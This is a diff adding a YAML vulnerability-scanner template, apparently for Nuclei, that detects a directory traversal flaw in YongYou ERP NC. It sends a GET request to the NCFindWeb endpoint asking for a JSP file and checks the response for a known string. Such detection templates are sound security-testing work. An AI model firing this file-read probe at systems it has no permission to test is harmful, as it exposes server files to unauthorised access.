@@ -1,0 +1,19 @@
+id: yongyou-erp-nc-directory-traversal
+info:
+  name: YongYou ERP NC Directory Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=ncwslogin.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<jsp:forward page=\"WEB-INF/jsp/resolution.jsp\">"
